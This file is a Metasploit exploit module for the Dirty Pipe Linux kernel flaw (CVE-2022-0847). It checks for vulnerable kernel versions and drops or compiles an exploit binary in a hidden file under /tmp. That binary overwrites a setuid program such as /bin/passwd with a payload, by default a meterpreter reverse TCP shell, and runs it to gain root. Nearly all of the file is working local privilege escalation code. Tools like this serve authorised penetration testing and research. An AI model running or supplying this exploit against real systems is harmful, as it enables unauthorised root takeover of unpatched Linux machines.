##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dirty Pipe Local Privilege Escalation via CVE-2022-0847',
        'Description' => %q{
          This exploit targets a vulnerability in the Linux kernel since 5.8, that allows
          writing of read only or immutable memory.

          The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
          The module exploits this vulnerability by overwriting a suid binary with the
          payload, executing it, and then writing the original data back.

          There are two major limitations of this exploit: the offset cannot be on a page
          boundary (it needs to write one byte before the offset to add a reference to
          this page to the pipe), and the write cannot cross a page boundary.
          This means the payload must be less than the page size (4096 bytes).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Max Kellermann', # Original vulnerability discovery
          'timwr', # Metasploit Module
        ],
        'DisclosureDate' => '2022-02-20',
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => [ 'linux' ],
        'Arch' => [
          ARCH_X64,
          ARCH_X86,
          ARCH_ARMLE,
          ARCH_AARCH64,
        ],
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'AppendExit' => true,
          'PrependSetresuid' => true,
          'PrependSetresgid' => true,
          'PrependSetreuid' => true,
          'PrependSetuid' => true,
          'PrependFork' => true,
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
        },
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2022-0847' ],
          [ 'URL', 'https://dirtypipe.cm4all.com' ],
          [ 'URL', 'https://haxx.in/files/dirtypipez.c' ],
        ],
        'Notes' => {
          'AKA' => [ 'Dirty Pipe' ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_options([
      OptString.new('WRITABLE_DIR', [ true, 'A directory where we can write files', '/tmp' ]),
      OptString.new('SUID_BINARY_PATH', [ false, 'The path to a suid binary', '/bin/passwd' ])
    ])
  end

  def check
    arch = kernel_arch
    unless live_compile? || arch.include?('x64') || arch.include?('aarch64') || arch.include?('x86') || arch.include?('armle')
      return CheckCode::Safe("System architecture #{arch} is not supported without live compilation")
    end

    kernel_version = Rex::Version.new kernel_release.split('-').first
    if kernel_version < Rex::Version.new('5.8') ||
       kernel_version >= Rex::Version.new('5.16.11') ||
       (kernel_version >= Rex::Version.new('5.15.25') && kernel_version < Rex::Version.new('5.16')) ||
       (kernel_version >= Rex::Version.new('5.10.102') && kernel_version < Rex::Version.new('5.11'))
      return CheckCode::Safe("Linux kernel version #{kernel_version} is not vulnerable")
    end

    CheckCode::Appears("Linux kernel version found: #{kernel_version}")
  end

  def exp_dir
    datastore['WRITABLE_DIR']
  end

  def exploit
    suid_binary_path = datastore['SUID_BINARY_PATH']
    fail_with(Failure::BadConfig, 'The suid binary was not found; try setting SUID_BINARY_PATH') if suid_binary_path.nil?
    fail_with(Failure::BadConfig, "The #{suid_binary_path} binary setuid bit is not set") unless setuid?(suid_binary_path)

    arch = kernel_arch
    vprint_status("Detected architecture: #{arch}")
    vprint_status("Detected payload arch: #{payload.arch.first}")
    unless arch == payload.arch.first
      fail_with(Failure::BadConfig, 'Payload/Host architecture mismatch. Please select the proper target architecture')
    end

    payload_data = generate_payload_exe[1..] # trim the first byte (0x74)
    if payload_data.length > 4095
      fail_with(Failure::BadConfig, "Payload size #{payload_data.length} is too large (> 4095)")
    end

    fail_with(Failure::BadConfig, "#{exp_dir} is not writable") unless writable?(exp_dir)
    exploit_file = "#{exp_dir}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"

    if live_compile?
      vprint_status('Live compiling exploit on system...')
      exploit_c = exploit_data('CVE-2022-0847', 'CVE-2022-0847.c')
      exploit_c.sub!(/payload_bytes.*$/, "payload_bytes[#{payload_data.length}] = {#{Rex::Text.to_num(payload_data)}};")
      upload_and_compile(exploit_file, exploit_c)
    else
      vprint_status('Dropping pre-compiled exploit on system...')
      exploit_bin = exploit_data('CVE-2022-0847', "CVE-2022-0847-#{arch}")
      payload_placeholder_index = exploit_bin.index('PAYLOAD_PLACEHOLDER')
      exploit_bin[payload_placeholder_index, payload_data.length] = payload_data
      upload_and_chmodx(exploit_file, exploit_bin)
    end

    register_file_for_cleanup(exploit_file)
    overwrite_file_path = datastore['SUID_BINARY_PATH']

    cmd = "#{exploit_file} #{overwrite_file_path}"
    print_status("Executing exploit '#{cmd}'")
    result = cmd_exec(cmd)
    vprint_status("Exploit result:\n#{result}")
  end
end
